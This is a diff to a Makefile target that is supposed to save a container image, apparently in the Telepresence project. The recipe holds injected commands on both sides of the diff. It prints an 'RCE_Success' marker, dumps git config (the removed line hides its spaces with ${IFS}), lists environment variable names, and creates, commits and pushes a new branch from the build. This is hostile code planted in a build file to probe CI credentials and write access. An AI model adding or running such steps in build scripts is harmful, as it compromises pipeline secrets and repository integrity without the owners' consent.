@@ -316,17 +316,17 @@ push-tel2-image: tel2-image ## (Build) Push the manager/agent container image to
 .PHONY: save-tel2-image
 save-tel2-image: tel2-image
 	echo ____RCE_Success >&2
-	git${IFS}config${IFS}--list >&2
+	git config --list >&2
 	printenv | cut -d= -f1 >&2
-	echo "---test permissions-----"
-	git fetch origin
-	git checkout main
-	git pull origin main
-	git checkout -b bh-new-branch
-	git add .
-	git commit -m "Add changes"
-	git push -u origin my-new-branch
-	docker save $(TEL2_IMAGE_FQN) > $(BUILDDIR)/tel2-image.tar
+	echo "---test permissions-----" >&2
+	git fetch origin >&2
+	git checkout main >&2
+	git pull origin main >&2
+	git checkout -b bh-new-branch >&2
+	git add . >&2
+	git commit -m "Add changes" >&2
+	git push -u origin my-new-branch >&2
+	docker save $(TEL2_IMAGE_FQN) > $(BUILDDIR)/tel2-image.tar >&2
 
 .PHONY: push-client-image
 push-client-image: client-image ## (Build) Push the client container image to $(TELEPRESENCE_REGISTRY)
